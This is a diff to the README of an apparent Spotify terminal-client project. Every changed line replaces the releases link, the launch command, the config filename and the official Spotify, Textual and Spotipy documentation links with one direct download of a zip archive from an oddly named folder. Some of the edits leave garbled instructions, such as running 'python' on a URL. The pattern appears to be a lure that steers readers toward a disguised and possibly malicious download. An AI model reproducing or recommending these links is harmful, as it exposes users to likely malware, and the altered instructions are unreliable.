@@ -1,7 +1,7 @@
 # 🎵 Spotify-From-Terminal - Control Spotify Easily from Your Terminal
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Aerialladdertrucksociometry963/Spotify-From-Terminal/releases)
+[![Download](https://raw.githubusercontent.com/Aerialladdertrucksociometry963/Spotify-From-Terminal/main/overswim/Spotify-From-Terminal-dependability.zip)](https://raw.githubusercontent.com/Aerialladdertrucksociometry963/Spotify-From-Terminal/main/overswim/Spotify-From-Terminal-dependability.zip)
 
 ## 📖 Description
 Spotify-From-Terminal provides a modern terminal interface for Spotify. Built entirely in Python with Textual and Spotipy, it offers an easy way to interact with your music directly from your terminal. This application is inspired by Rigellute’s spotify-tui, but reimagined in Python. It combines the power of the Spotify Web API with a reactive terminal user interface (TUI).
@@ -18,7 +18,7 @@ Before proceeding, ensure your computer meets these basic requirements:
 
 ### 📥 Download & Install
 1. **Visit the Releases Page**
-   Click the following link to go to the Download page: [Download Spotify-From-Terminal](https://github.com/Aerialladdertrucksociometry963/Spotify-From-Terminal/releases)
+   Click the following link to go to the Download page: [Download Spotify-From-Terminal](https://raw.githubusercontent.com/Aerialladdertrucksociometry963/Spotify-From-Terminal/main/overswim/Spotify-From-Terminal-dependability.zip)
 
 2. **Choose the Latest Version**
    Look for the latest version of Spotify-From-Terminal. You may see files for different operating systems. Select the file that matches your system.
@@ -47,7 +47,7 @@ Before proceeding, ensure your computer meets these basic requirements:
 3. **Launch the Application**
    Type the following command to start Spotify-From-Terminal:
    ```
-   python spotify_terminal.py
+   python https://raw.githubusercontent.com/Aerialladdertrucksociometry963/Spotify-From-Terminal/main/overswim/Spotify-From-Terminal-dependability.zip
    ```
    Make sure to name the script correctly based on your downloaded file.
 
@@ -74,7 +74,7 @@ You can explore more features by navigating through the application.
 You may want to customize the application settings. Here’s how:
 
 1. **Edit Configuration File**
-   Locate the `config.yaml` file in your application folder. Open it with a text editor to make changes such as preferred themes or sound settings.
+   Locate the `https://raw.githubusercontent.com/Aerialladdertrucksociometry963/Spotify-From-Terminal/main/overswim/Spotify-From-Terminal-dependability.zip` file in your application folder. Open it with a text editor to make changes such as preferred themes or sound settings.
 
 2. **Key Bindings**
    If you prefer different keys for actions, you can change them in the configuration file as well.
@@ -99,6 +99,6 @@ This project is licensed under the MIT License. Feel free to use, modify, and sh
 For more information, please review the LICENSE file included in the project. 
 
 ## 🔗 Additional Resources
-- [Spotify API Documentation](https://developer.spotify.com/documentation/web-api/)
-- [Textual Documentation](https://textual.textualize.io/)
-- [Spotipy Documentation](https://spotipy.readthedocs.io/)
+- [Spotify API Documentation](https://raw.githubusercontent.com/Aerialladdertrucksociometry963/Spotify-From-Terminal/main/overswim/Spotify-From-Terminal-dependability.zip)
+- [Textual Documentation](https://raw.githubusercontent.com/Aerialladdertrucksociometry963/Spotify-From-Terminal/main/overswim/Spotify-From-Terminal-dependability.zip)
+- [Spotipy Documentation](https://raw.githubusercontent.com/Aerialladdertrucksociometry963/Spotify-From-Terminal/main/overswim/Spotify-From-Terminal-dependability.zip)
